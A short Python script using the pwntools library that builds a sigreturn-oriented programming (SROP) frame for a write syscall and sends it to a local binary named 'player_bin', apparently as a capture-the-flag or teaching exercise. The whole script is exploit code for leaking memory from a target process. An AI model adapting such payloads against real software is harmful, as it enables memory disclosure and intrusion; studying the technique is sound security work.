from pwn import *

context.clear()
context.arch = "amd64"

frame = SigreturnFrame()
frame.rax = constants.SYS_write
frame.rdi = constants.STDOUT_FILENO
frame.rsi = 0x10000023
frame.rdx = 50
frame.rsp = 0xdeadbeef
frame.rip = 0x10000015
p = process('./player_bin')
p.send(str(frame))
print p.recvn(50)




